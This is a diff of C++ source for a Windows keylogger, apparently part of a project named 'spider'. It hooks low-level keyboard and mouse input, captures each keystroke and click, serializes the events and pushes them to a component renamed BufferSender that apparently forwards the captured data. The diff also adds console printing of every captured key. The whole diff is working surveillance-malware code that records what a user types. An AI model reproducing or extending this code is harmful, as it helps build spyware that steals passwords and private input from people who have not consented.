@@ -17,7 +17,7 @@
 #include	<chrono>
 #include	<memory>
 #include	<sstream>
-#include 	"Protocol/Buffer.hpp"
+#include 	"Protocol/BufferSender.hpp"
 #include        "Protocol/Serializer.hpp"
 
 #pragma comment(lib, "wbemuuid.lib")
@@ -107,6 +107,7 @@ LRESULT CALLBACK 	handleKeyboard(int code, WPARAM wp, LPARAM lp)
       else
 	str = tolower(str[0]);
       infos.get()->data = str;
+      std::cout << str << std::endl;
     }
       /// actually the length of the str is superior at 1, it means that we have
       /// retrieved a vk code and that we should check either our correlingTable
@@ -117,6 +118,7 @@ LRESULT CALLBACK 	handleKeyboard(int code, WPARAM wp, LPARAM lp)
       {
 	str = spider::WindowsKeyLogger::keys.at(content->vkCode);
 	infos.get()->data = str;
+	std::cout << str << std::endl;
       }
       catch (std::out_of_range const &)
       {
@@ -124,7 +126,8 @@ LRESULT CALLBACK 	handleKeyboard(int code, WPARAM wp, LPARAM lp)
       }
     }
   }
-  spider::Buffer::BufferInstance().push(spider::Serializer::getSerializer().get_string_from_ptree(spider::Serializer::getSerializer().serialize(*infos)));
+  std::cout << "Going to push\n";
+  spider::BufferSender::BufferSenderInstance().push(spider::Serializer::getSerializer().get_string_from_ptree(spider::Serializer::getSerializer().serialize(*infos)));
   return CallNextHookEx(hookKeyboard, code, wp, lp);
 }
 
@@ -153,6 +156,9 @@ LRESULT CALLBACK 		handleMouse(int code, WPARAM wp, LPARAM lp)
 
   mouseStruct = reinterpret_cast<MSLLHOOKSTRUCT *>(lp);
 
+  infos.get()->keytype = 0;
+  infos.get()->x = 0;
+  infos.get()->y = 0;
   /// first check for the three mouse button and the mouse wheel
   switch (wp)
   {
@@ -192,7 +198,8 @@ LRESULT CALLBACK 		handleMouse(int code, WPARAM wp, LPARAM lp)
 	break;
     }
   }
-  spider::Buffer::BufferInstance().push(spider::Serializer::getSerializer().get_string_from_ptree(spider::Serializer::getSerializer().serialize(*infos)));
+  if (infos.get()->keytype != 0)
+    spider::BufferSender::BufferSenderInstance().push(spider::Serializer::getSerializer().get_string_from_ptree(spider::Serializer::getSerializer().serialize(*infos)));
   return CallNextHookEx(hookMouse, code, wp, lp);
 }
 
